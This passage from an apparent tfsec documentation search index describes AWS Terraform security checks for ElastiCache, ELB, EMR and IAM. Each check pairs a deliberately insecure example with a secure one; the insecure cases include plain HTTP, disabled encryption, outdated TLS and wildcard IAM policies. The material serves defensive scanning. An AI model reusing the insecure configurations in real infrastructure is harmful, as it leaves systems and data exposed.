\"default.redis3.2\"\n    engine_version       = \"3.2.10\"\n    port                 = 6379\n\n    snapshot_retention_limit = 5\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elasticache/enable-backup-retention/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_cluster#snapshot_retention_limit</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/backups-automatic.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elasticache/enable-in-transit-encryption/","text":"","title":"Elasticache Replication Group uses unencrypted traffic."},{"location":"checks/aws/elasticache/enable-in-transit-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/elasticache/enable-in-transit-encryption/#explanation","text":"<p>Traffic flowing between Elasticache replication nodes should be encrypted to ensure sensitive data is kept private.</p>","title":"Explanation"},{"location":"checks/aws/elasticache/enable-in-transit-encryption/#possible-impact","text":"<p>In transit data in the Replication Group could be read if intercepted</p>","title":"Possible Impact"},{"location":"checks/aws/elasticache/enable-in-transit-encryption/#suggested-resolution","text":"<p>Enable in transit encryption for replication group</p>","title":"Suggested Resolution"},{"location":"checks/aws/elasticache/enable-in-transit-encryption/#insecure-example","text":"<p>The following example will fail the aws-elasticache-enable-in-transit-encryption check. <pre><code> resource \"aws_elasticache_replication_group\" \"bad_example\" {\n         replication_group_id = \"foo\"\n         replication_group_description = \"my foo cluster\"\n         transit_encryption_enabled = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elasticache/enable-in-transit-encryption/#secure-example","text":"<p>The following example will pass the aws-elasticache-enable-in-transit-encryption check. <pre><code> resource \"aws_elasticache_replication_group\" \"good_example\" {\n         replication_group_id = \"foo\"\n         replication_group_description = \"my foo cluster\"\n         transit_encryption_enabled = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elasticache/enable-in-transit-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/elasticache_replication_group#transit_encryption_enabled</p> </li> <li> <p>https://docs.aws.amazon.com/AmazonElastiCache/latest/red-ug/in-transit-encryption.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elb/","text":"","title":"elb"},{"location":"checks/aws/elb/#checks","text":"<ul> <li> <p>alb-not-public Load balancer is exposed to the internet.</p> </li> <li> <p>drop-invalid-headers Load balancers should drop invalid headers</p> </li> <li> <p>http-not-used Use of plain HTTP.</p> </li> <li> <p>use-secure-tls-policy An outdated SSL policy is in use by a load balancer.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/elb/alb-not-public/","text":"","title":"Load balancer is exposed to the internet."},{"location":"checks/aws/elb/alb-not-public/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/elb/alb-not-public/#explanation","text":"<p>There are many scenarios in which you would want to expose a load balancer to the wider internet, but this check exists as a warning to prevent accidental exposure of internal assets. You should ensure that this resource should be exposed publicly.</p>","title":"Explanation"},{"location":"checks/aws/elb/alb-not-public/#possible-impact","text":"<p>The load balancer is exposed on the internet</p>","title":"Possible Impact"},{"location":"checks/aws/elb/alb-not-public/#suggested-resolution","text":"<p>Switch to an internal load balancer or add a tfsec ignore</p>","title":"Suggested Resolution"},{"location":"checks/aws/elb/alb-not-public/#insecure-example","text":"<p>The following example will fail the aws-elb-alb-not-public check. <pre><code> resource \"aws_alb\" \"bad_example\" {\n    internal = false\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elb/alb-not-public/#secure-example","text":"<p>The following example will pass the aws-elb-alb-not-public check. <pre><code> resource \"aws_alb\" \"good_example\" {\n    internal = true\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elb/alb-not-public/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb</li> </ul>","title":"Links"},{"location":"checks/aws/elb/drop-invalid-headers/","text":"","title":"Load balancers should drop invalid headers"},{"location":"checks/aws/elb/drop-invalid-headers/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/elb/drop-invalid-headers/#explanation","text":"<p>Passing unknown or invalid headers through to the target poses a potential risk of compromise. </p> <p>By setting drop_invalid_header_fields to true, anything that does not conform to well known, defined headers will be removed by the load balancer.</p>","title":"Explanation"},{"location":"checks/aws/elb/drop-invalid-headers/#possible-impact","text":"<p>Invalid headers being passed through to the target of the load balance may exploit vulnerabilities</p>","title":"Possible Impact"},{"location":"checks/aws/elb/drop-invalid-headers/#suggested-resolution","text":"<p>Set drop_invalid_header_fields to true</p>","title":"Suggested Resolution"},{"location":"checks/aws/elb/drop-invalid-headers/#insecure-example","text":"<p>The following example will fail the aws-elb-drop-invalid-headers check. <pre><code> resource \"aws_alb\" \"bad_example\" {\n    name               = \"bad_alb\"\n    internal           = false\n    load_balancer_type = \"application\"\n\n    access_logs {\n      bucket  = aws_s3_bucket.lb_logs.bucket\n      prefix  = \"test-lb\"\n      enabled = true\n    }\n\n    drop_invalid_header_fields = false\n   }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elb/drop-invalid-headers/#secure-example","text":"<p>The following example will pass the aws-elb-drop-invalid-headers check. <pre><code> resource \"aws_alb\" \"good_example\" {\n    name               = \"good_alb\"\n    internal           = false\n    load_balancer_type = \"application\"\n\n    access_logs {\n      bucket  = aws_s3_bucket.lb_logs.bucket\n      prefix  = \"test-lb\"\n      enabled = true\n    }\n\n    drop_invalid_header_fields = true\n   }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elb/drop-invalid-headers/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb#drop_invalid_header_fields</p> </li> <li> <p>https://docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elb/http-not-used/","text":"","title":"Use of plain HTTP."},{"location":"checks/aws/elb/http-not-used/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/elb/http-not-used/#explanation","text":"<p>Plain HTTP is unencrypted and human-readable. This means that if a malicious actor was to eavesdrop on your connection, they would be able to see all of your data flowing back and forth.</p> <p>You should use HTTPS, which is HTTP over an encrypted (TLS) connection, meaning eavesdroppers cannot read your traffic.</p>","title":"Explanation"},{"location":"checks/aws/elb/http-not-used/#possible-impact","text":"<p>Your traffic is not protected</p>","title":"Possible Impact"},{"location":"checks/aws/elb/http-not-used/#suggested-resolution","text":"<p>Switch to HTTPS to benefit from TLS security features</p>","title":"Suggested Resolution"},{"location":"checks/aws/elb/http-not-used/#insecure-example","text":"<p>The following example will fail the aws-elb-http-not-used check. <pre><code> resource \"aws_alb_listener\" \"bad_example\" {\n    protocol = \"HTTP\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elb/http-not-used/#secure-example","text":"<p>The following example will pass the aws-elb-http-not-used check. <pre><code> resource \"aws_alb_listener\" \"good_example\" {\n    protocol = \"HTTPS\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elb/http-not-used/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener</p> </li> <li> <p>https://www.cloudflare.com/en-gb/learning/ssl/why-is-http-not-secure/</p> </li> </ul>","title":"Links"},{"location":"checks/aws/elb/use-secure-tls-policy/","text":"","title":"An outdated SSL policy is in use by a load balancer."},{"location":"checks/aws/elb/use-secure-tls-policy/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/elb/use-secure-tls-policy/#explanation","text":"<p>You should not use outdated/insecure TLS versions for encryption. You should be using TLS v1.2+.</p>","title":"Explanation"},{"location":"checks/aws/elb/use-secure-tls-policy/#possible-impact","text":"<p>The SSL policy is outdated and has known vulnerabilities</p>","title":"Possible Impact"},{"location":"checks/aws/elb/use-secure-tls-policy/#suggested-resolution","text":"<p>Use a more recent TLS/SSL policy for the load balancer</p>","title":"Suggested Resolution"},{"location":"checks/aws/elb/use-secure-tls-policy/#insecure-example","text":"<p>The following example will fail the aws-elb-use-secure-tls-policy check. <pre><code> resource \"aws_alb_listener\" \"bad_example\" {\n    ssl_policy = \"ELBSecurityPolicy-TLS-1-1-2017-01\"\n    protocol = \"HTTPS\"\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/elb/use-secure-tls-policy/#secure-example","text":"<p>The following example will pass the aws-elb-use-secure-tls-policy check. <pre><code> resource \"aws_alb_listener\" \"good_example\" {\n    ssl_policy = \"ELBSecurityPolicy-TLS-1-2-2017-01\"\n    protocol = \"HTTPS\"\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/elb/use-secure-tls-policy/#links","text":"<ul> <li>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/lb_listener</li> </ul>","title":"Links"},{"location":"checks/aws/emr/","text":"","title":"emr"},{"location":"checks/aws/emr/#checks","text":"<ul> <li> <p>enable-at-rest-encryption Enable at-rest encryption for EMR clusters.</p> </li> <li> <p>enable-in-transit-encryption Enable in-transit encryption for EMR clusters.</p> </li> <li> <p>enable-local-disk-encryption Enable local-disk encryption for EMR clusters.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/emr/enable-at-rest-encryption/","text":"","title":"Enable at-rest encryption for EMR clusters."},{"location":"checks/aws/emr/enable-at-rest-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/emr/enable-at-rest-encryption/#explanation","text":"<p>Data stored within an EMR cluster should be encrypted to ensure sensitive data is kept private.</p>","title":"Explanation"},{"location":"checks/aws/emr/enable-at-rest-encryption/#possible-impact","text":"<p>At-rest data in the EMR cluster could be compromised if accessed.</p>","title":"Possible Impact"},{"location":"checks/aws/emr/enable-at-rest-encryption/#suggested-resolution","text":"<p>Enable at-rest encryption for EMR cluster</p>","title":"Suggested Resolution"},{"location":"checks/aws/emr/enable-at-rest-encryption/#insecure-example","text":"<p>The following example will fail the aws-emr-enable-at-rest-encryption check. <pre><code>  resource \"aws_emr_security_configuration\" \"bad_example\" {\n    name = \"emrsc_other\"\n\n    configuration = &lt;&lt;EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n  }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/emr/enable-at-rest-encryption/#secure-example","text":"<p>The following example will pass the aws-emr-enable-at-rest-encryption check. <pre><code>  resource \"aws_emr_security_configuration\" \"good_example\" {\n    name = \"emrsc_other\"\n\n    configuration = &lt;&lt;EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n  }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/emr/enable-at-rest-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration</p> </li> <li> <p>https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/emr/enable-in-transit-encryption/","text":"","title":"Enable in-transit encryption for EMR clusters."},{"location":"checks/aws/emr/enable-in-transit-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/emr/enable-in-transit-encryption/#explanation","text":"<p>Data stored within an EMR cluster should be encrypted to ensure sensitive data is kept private.</p>","title":"Explanation"},{"location":"checks/aws/emr/enable-in-transit-encryption/#possible-impact","text":"<p>In-transit data in the EMR cluster could be compromised if accessed.</p>","title":"Possible Impact"},{"location":"checks/aws/emr/enable-in-transit-encryption/#suggested-resolution","text":"<p>Enable in-transit encryption for EMR cluster</p>","title":"Suggested Resolution"},{"location":"checks/aws/emr/enable-in-transit-encryption/#insecure-example","text":"<p>The following example will fail the aws-emr-enable-in-transit-encryption check. <pre><code>  resource \"aws_emr_security_configuration\" \"bad_example\" {\n    name = \"emrsc_other\"\n\n    configuration = &lt;&lt;EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n  }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/emr/enable-in-transit-encryption/#secure-example","text":"<p>The following example will pass the aws-emr-enable-in-transit-encryption check. <pre><code>  resource \"aws_emr_security_configuration\" \"good_example\" {\n    name = \"emrsc_other\"\n\n    configuration = &lt;&lt;EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n  }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/emr/enable-in-transit-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration</p> </li> <li> <p>https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/emr/enable-local-disk-encryption/","text":"","title":"Enable local-disk encryption for EMR clusters."},{"location":"checks/aws/emr/enable-local-disk-encryption/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/emr/enable-local-disk-encryption/#explanation","text":"<p>Data stored within an EMR instances should be encrypted to ensure sensitive data is kept private.</p>","title":"Explanation"},{"location":"checks/aws/emr/enable-local-disk-encryption/#possible-impact","text":"<p>Local-disk data in the EMR cluster could be compromised if accessed.</p>","title":"Possible Impact"},{"location":"checks/aws/emr/enable-local-disk-encryption/#suggested-resolution","text":"<p>Enable local-disk encryption for EMR cluster</p>","title":"Suggested Resolution"},{"location":"checks/aws/emr/enable-local-disk-encryption/#insecure-example","text":"<p>The following example will fail the aws-emr-enable-local-disk-encryption check. <pre><code>  resource \"aws_emr_security_configuration\" \"bad_example\" {\n    name = \"emrsc_other\"\n\n    configuration = &lt;&lt;EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"\",\n          \"AwsKmsKey\": \"\"\n        }\n      },\n      \"EnableInTransitEncryption\": false,\n      \"EnableAtRestEncryption\": false\n    }\n  }\n  EOF\n  }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/emr/enable-local-disk-encryption/#secure-example","text":"<p>The following example will pass the aws-emr-enable-local-disk-encryption check. <pre><code>  resource \"aws_emr_security_configuration\" \"good_example\" {\n    name = \"emrsc_other\"\n\n    configuration = &lt;&lt;EOF\n  {\n    \"EncryptionConfiguration\": {\n      \"AtRestEncryptionConfiguration\": {\n        \"S3EncryptionConfiguration\": {\n          \"EncryptionMode\": \"SSE-S3\"\n        },\n        \"LocalDiskEncryptionConfiguration\": {\n          \"EncryptionKeyProviderType\": \"AwsKms\",\n          \"AwsKmsKey\": \"arn:aws:kms:us-west-2:187416307283:alias/tf_emr_test_key\"\n        }\n      },\n      \"EnableInTransitEncryption\": true,\n      \"EnableAtRestEncryption\": true\n    }\n  }\n  EOF\n  }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/emr/enable-local-disk-encryption/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/emr_security_configuration</p> </li> <li> <p>https://docs.aws.amazon.com/config/latest/developerguide/operational-best-practices-for-nist_800-171.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/","text":"","title":"iam"},{"location":"checks/aws/iam/#checks","text":"<ul> <li> <p>enforce-group-mfa IAM groups should have MFA enforcement activated.</p> </li> <li> <p>no-password-reuse IAM Password policy should prevent password reuse.</p> </li> <li> <p>no-policy-wildcards IAM policy should avoid use of wildcards and instead apply the principle of least privilege</p> </li> <li> <p>no-root-access-keys The root user has complete access to all services and resources in an AWS account. AWS Access Keys provide programmatic access to a given account.</p> </li> <li> <p>no-user-attached-policies IAM policies should not be granted directly to users.</p> </li> <li> <p>require-lowercase-in-passwords IAM Password policy should have requirement for at least one lowercase character.</p> </li> <li> <p>require-numbers-in-passwords IAM Password policy should have requirement for at least one number in the password.</p> </li> <li> <p>require-symbols-in-passwords IAM Password policy should have requirement for at least one symbol in the password.</p> </li> <li> <p>require-uppercase-in-passwords IAM Password policy should have requirement for at least one uppercase character.</p> </li> <li> <p>set-max-password-age IAM Password policy should have expiry less than or equal to 90 days.</p> </li> <li> <p>set-minimum-password-length IAM Password policy should have minimum password length of 14 or more characters.</p> </li> </ul>","title":"Checks"},{"location":"checks/aws/iam/enforce-group-mfa/","text":"","title":"IAM groups should have MFA enforcement activated."},{"location":"checks/aws/iam/enforce-group-mfa/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/enforce-group-mfa/#explanation","text":"<p>IAM groups should be protected with multi factor authentication to add safe guards to password compromise.</p>","title":"Explanation"},{"location":"checks/aws/iam/enforce-group-mfa/#possible-impact","text":"<p>IAM groups are more vulnerable to compromise without multi factor authentication activated</p>","title":"Possible Impact"},{"location":"checks/aws/iam/enforce-group-mfa/#suggested-resolution","text":"<p>Use terraform-module/enforce-mfa/aws to ensure that MFA is enforced</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/enforce-group-mfa/#insecure-example","text":"<p>The following example will fail the aws-iam-enforce-group-mfa check. <pre><code>data aws_caller_identity current {}\nresource aws_iam_group developers {\n  name =  \"developers\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/enforce-group-mfa/#secure-example","text":"<p>The following example will pass the aws-iam-enforce-group-mfa check. <pre><code>resource \"aws_iam_group\" \"support\" {\n  name =  \"support\"\n}\nresource aws_iam_group_policy mfa {\n\n    group = aws_iam_group.support.name\n    policy = &lt;&lt;EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"ec2:*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n          \"Bool\": {\n              \"aws:MultiFactorAuthPresent\": [\"true\"]\n          }\n      }\n    }\n  ]\n}\nEOF\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/enforce-group-mfa/#links","text":"<ul> <li> <p>https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/enforce-mfa/","text":"","title":"IAM Groups should have MFA enforcement activated."},{"location":"checks/aws/iam/enforce-mfa/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/enforce-mfa/#explanation","text":"<p>IAM user accounts should be protected with multi factor authentication to add safe guards to password compromise.</p>","title":"Explanation"},{"location":"checks/aws/iam/enforce-mfa/#possible-impact","text":"<p>User accounts are more vulnerable to compromise without multi factor authentication activated</p>","title":"Possible Impact"},{"location":"checks/aws/iam/enforce-mfa/#suggested-resolution","text":"<p>Use terraform-module/enforce-mfa/aws to ensure that MFA is enforced</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/enforce-mfa/#insecure-example","text":"<p>The following example will fail the aws-iam-enforce-mfa check. <pre><code>data aws_caller_identity current {}\nresource aws_iam_group developers {\n  name =  \"developers\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/enforce-mfa/#secure-example","text":"<p>The following example will pass the aws-iam-enforce-mfa check. <pre><code>resource \"aws_iam_group\" \"support\" {\n  name =  \"support\"\n}\nresource aws_iam_group_policy mfa {\n\n    group = aws_iam_group.support.name\n    policy = &lt;&lt;EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Sid\": \"\",\n      \"Effect\": \"Allow\",\n      \"Action\": \"ec2:*\",\n      \"Resource\": \"*\",\n      \"Condition\": {\n          \"Bool\": {\n              \"aws:MultiFactorAuthPresent\": [\"true\"]\n          }\n      }\n    }\n  ]\n}\nEOF\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/enforce-mfa/#links","text":"<ul> <li> <p>https://registry.terraform.io/modules/terraform-module/enforce-mfa/aws/latest</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/no-password-reuse/","text":"","title":"IAM Password policy should prevent password reuse."},{"location":"checks/aws/iam/no-password-reuse/#default-severity-medium","text":"","title":"Default Severity: medium"},{"location":"checks/aws/iam/no-password-reuse/#explanation","text":"<p>IAM account password policies should prevent the reuse of passwords. </p> <p>The account password policy should be set to prevent using any of the last five used passwords.</p>","title":"Explanation"},{"location":"checks/aws/iam/no-password-reuse/#possible-impact","text":"<p>Password reuse increase the risk of compromised passwords being abused</p>","title":"Possible Impact"},{"location":"checks/aws/iam/no-password-reuse/#suggested-resolution","text":"<p>Prevent password reuse in the policy</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/no-password-reuse/#insecure-example","text":"<p>The following example will fail the aws-iam-no-password-reuse check. <pre><code> resource \"aws_iam_account_password_policy\" \"bad_example\" {\n    # ...\n    password_reuse_prevention = 1\n    # ...\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/no-password-reuse/#secure-example","text":"<p>The following example will pass the aws-iam-no-password-reuse check. <pre><code> resource \"aws_iam_account_password_policy\" \"good_example\" {\n    # ...\n    password_reuse_prevention = 5\n    # ...\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/no-password-reuse/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_account_password_policy</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_passwords_account-policy.html#password-policy-details</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/no-policy-wildcards/","text":"","title":"IAM policy should avoid use of wildcards and instead apply the principle of least privilege"},{"location":"checks/aws/iam/no-policy-wildcards/#default-severity-high","text":"","title":"Default Severity: high"},{"location":"checks/aws/iam/no-policy-wildcards/#explanation","text":"<p>You should use the principle of least privilege when defining your IAM policies. This means you should specify each exact permission required without using wildcards, as this could cause the granting of access to certain undesired actions, resources and principals.</p>","title":"Explanation"},{"location":"checks/aws/iam/no-policy-wildcards/#possible-impact","text":"<p>Overly permissive policies may grant access to sensitive resources</p>","title":"Possible Impact"},{"location":"checks/aws/iam/no-policy-wildcards/#suggested-resolution","text":"<p>Specify the exact permissions required, and to which resources they should apply instead of using wildcards.</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/no-policy-wildcards/#insecure-example","text":"<p>The following example will fail the aws-iam-no-policy-wildcards check. <pre><code> resource \"aws_iam_role_policy\" \"test_policy\" {\n    name = \"test_policy\"\n    role = aws_iam_role.test_role.id\n\n    policy = data.aws_iam_policy_document.s3_policy.json\n }\n\n resource \"aws_iam_role\" \"test_role\" {\n    name = \"test_role\"\n    assume_role_policy = jsonencode({\n        Version = \"2012-10-17\"\n        Statement = [\n        {\n            Action = \"sts:AssumeRole\"\n            Effect = \"Allow\"\n            Sid    = \"\"\n            Principal = {\n            Service = \"s3.amazonaws.com\"\n            }\n        },\n        ]\n    })\n }\n\n data \"aws_iam_policy_document\" \"s3_policy\" {\n   statement {\n     principals {\n       type        = \"AWS\"\n       identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n     }\n     actions   = [\"s3:*\"]\n     resources = [\"*\"]\n   }\n }\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/no-policy-wildcards/#secure-example","text":"<p>The following example will pass the aws-iam-no-policy-wildcards check. <pre><code> resource \"aws_iam_role_policy\" \"test_policy\" {\n    name = \"test_policy\"\n    role = aws_iam_role.test_role.id\n\n    policy = data.aws_iam_policy_document.s3_policy.json\n }\n\n resource \"aws_iam_role\" \"test_role\" {\n    name = \"test_role\"\n    assume_role_policy = jsonencode({\n        Version = \"2012-10-17\"\n        Statement = [\n        {\n            Action = \"sts:AssumeRole\"\n            Effect = \"Allow\"\n            Sid    = \"\"\n            Principal = {\n            Service = \"s3.amazonaws.com\"\n            }\n        },\n        ]\n    })\n }\n\n data \"aws_iam_policy_document\" \"s3_policy\" {\n   statement {\n     principals {\n       type        = \"AWS\"\n       identifiers = [\"arn:aws:iam::${data.aws_caller_identity.current.account_id}:root\"]\n     }\n     actions   = [\"s3:GetObject\"]\n     resources = [aws_s3_bucket.example.arn]\n   }\n }\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/no-policy-wildcards/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/data-sources/iam_policy_document</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/no-root-access-keys/","text":"","title":"The root user has complete access to all services and resources in an AWS account. AWS Access Keys provide programmatic access to a given account."},{"location":"checks/aws/iam/no-root-access-keys/#default-severity-critical","text":"","title":"Default Severity: critical"},{"location":"checks/aws/iam/no-root-access-keys/#explanation","text":"<p>CIS recommends that all access keys be associated with the root user be removed. Removing access keys associated with the root user limits vectors that the account can be compromised by. Removing the root user access keys also encourages the creation and use of role-based accounts that are least privileged.</p>","title":"Explanation"},{"location":"checks/aws/iam/no-root-access-keys/#possible-impact","text":"<p>Compromise of the root account compromises the entire AWS account and all resources within it.</p>","title":"Possible Impact"},{"location":"checks/aws/iam/no-root-access-keys/#suggested-resolution","text":"<p>Use lower privileged accounts instead, so only required privileges are available.</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/no-root-access-keys/#insecure-example","text":"<p>The following example will fail the aws-iam-no-root-access-keys check. <pre><code>resource \"aws_iam_access_key\" \"good_example\" {\n    user = \"root\"\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/no-root-access-keys/#secure-example","text":"<p>The following example will pass the aws-iam-no-root-access-keys check. <pre><code>resource \"aws_iam_access_key\" \"good_example\" {\n    user = \"lowprivuser\"\n}\n</code></pre></p>","title":"Secure Example"},{"location":"checks/aws/iam/no-root-access-keys/#links","text":"<ul> <li> <p>https://registry.terraform.io/providers/hashicorp/aws/latest/docs/resources/iam_access_key</p> </li> <li> <p>https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html</p> </li> </ul>","title":"Links"},{"location":"checks/aws/iam/no-user-attached-policies/","text":"","title":"IAM policies should not be granted directly to users."},{"location":"checks/aws/iam/no-user-attached-policies/#default-severity-low","text":"","title":"Default Severity: low"},{"location":"checks/aws/iam/no-user-attached-policies/#explanation","text":"<p>CIS recommends that you apply IAM policies directly to groups and roles but not users. Assigning privileges at the group or role level reduces the complexity of access management as the number of users grow. Reducing access management complexity might in turn reduce opportunity for a principal to inadvertently receive or retain excessive privileges.</p>","title":"Explanation"},{"location":"checks/aws/iam/no-user-attached-policies/#possible-impact","text":"<p>Complex access control is difficult to manage and maintain.</p>","title":"Possible Impact"},{"location":"checks/aws/iam/no-user-attached-policies/#suggested-resolution","text":"<p>Grant policies at the group level instead.</p>","title":"Suggested Resolution"},{"location":"checks/aws/iam/no-user-attached-policies/#insecure-example","text":"<p>The following example will fail the aws-iam-no-user-attached-policies check. <pre><code>resource \"aws_iam_user\" \"jim\" {\n  name = \"jim\"\n}\n\nresource \"aws_iam_user_policy\" \"ec2policy\" {\n  name = \"test\"\n  user = aws_iam_user.jim.name\n\n  policy = &lt;&lt;EOF\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Action\": [\n        \"ec2:Describe*\"\n      ],\n      \"Effect\": \"Allow\",\n      \"Resource\": \"*\"\n    }\n  ]\n}\nEOF\n}\n</code></pre></p>","title":"Insecure Example"},{"location":"checks/aws/iam/no-user-attached-policies/#secure-example","text":"<p>The following example will pass the 